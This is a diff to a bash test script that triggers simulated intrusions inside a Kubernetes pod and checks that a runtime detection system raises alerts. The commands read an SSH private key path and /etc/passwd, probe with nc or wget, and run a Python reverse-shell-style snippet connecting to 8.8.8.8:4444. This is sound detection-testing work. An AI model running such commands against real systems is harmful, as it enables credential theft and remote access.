@@ -131,6 +131,68 @@ else
     skip "V6: gateway IP not available — skipping"
 fi
 
+# ── V7: SSH private key read ─────────────────────────────────────────────────
+echo "=== V7: SSH private key read ==="
+V7_SINCE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+$KUBECTL exec "$TARGET_POD" -n "$NAMESPACE" -- bash -c \
+    "mkdir -p /root/.ssh && echo 'test-key' > /root/.ssh/id_rsa && cat /root/.ssh/id_rsa" \
+    >/dev/null 2>&1 || true
+if expect_alert "CRITICAL.*sensitive_file_access.*service=user-service.*id_rsa" 60 "$V7_SINCE"; then
+    pass "V7: CRITICAL sensitive_file_access — /root/.ssh/id_rsa detected"
+else
+    fail "V7: no CRITICAL sensitive_file_access alert within timeout"
+fi
+
+# ── V8: Network recon tool ───────────────────────────────────────────────────
+echo "=== V8: Network recon tool ==="
+V8_SINCE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+V8_TRIGGERED=false
+if $KUBECTL exec "$TARGET_POD" -n "$NAMESPACE" -- which nc >/dev/null 2>&1; then
+    $KUBECTL exec "$TARGET_POD" -n "$NAMESPACE" -- nc -w 2 1.1.1.1 80 >/dev/null 2>&1 || true
+    V8_TRIGGERED=true
+elif $KUBECTL exec "$TARGET_POD" -n "$NAMESPACE" -- which wget >/dev/null 2>&1; then
+    $KUBECTL exec "$TARGET_POD" -n "$NAMESPACE" -- wget --timeout=2 -q http://1.1.1.1 >/dev/null 2>&1 || true
+    V8_TRIGGERED=true
+fi
+if [[ "$V8_TRIGGERED" == true ]]; then
+    if expect_alert "HIGH.*network_tool_container.*service=user-service" 60 "$V8_SINCE"; then
+        pass "V8: HIGH network_tool_container detected"
+    else
+        fail "V8: no HIGH network_tool_container alert within timeout"
+    fi
+else
+    skip "V8: nc/wget not available in container image"
+fi
+
+# ── V9: /etc/passwd recon ────────────────────────────────────────────────────
+echo "=== V9: /etc/passwd recon ==="
+V9_SINCE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+$KUBECTL exec "$TARGET_POD" -n "$NAMESPACE" -- cat /etc/passwd >/dev/null 2>&1 || true
+if expect_alert "MEDIUM.*sensitive_file_access.*service=user-service.*passwd" 60 "$V9_SINCE"; then
+    pass "V9: MEDIUM sensitive_file_access — /etc/passwd detected"
+else
+    fail "V9: no MEDIUM sensitive_file_access alert within timeout"
+fi
+
+# ── V10: Reverse shell simulation ────────────────────────────────────────────
+echo "=== V10: Reverse shell simulation ==="
+V10_SINCE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+$KUBECTL exec "$TARGET_POD" -n "$NAMESPACE" -- bash -c "
+    python3 -c \"
+import socket, subprocess
+s = socket.socket()
+s.settimeout(2)
+try: s.connect(('8.8.8.8', 4444))
+except: pass
+subprocess.call(['/bin/sh'])
+\"" >/dev/null 2>&1 || true
+if expect_alert "CRITICAL.*shell_spawn_container.*service=user-service" 60 "$V10_SINCE" && \
+   expect_alert "HIGH.*unauthorized_external_connect.*service=user-service.*8\.8\.8\.8" 60 "$V10_SINCE"; then
+    pass "V10: reverse shell — CRITICAL shell_spawn + HIGH unauthorized_external_connect both detected"
+else
+    fail "V10: reverse shell — one or both alerts missing within timeout"
+fi
+
 # ── summary ───────────────────────────────────────────────────────────────────
 echo ""
 echo "══════════════════════════════════"
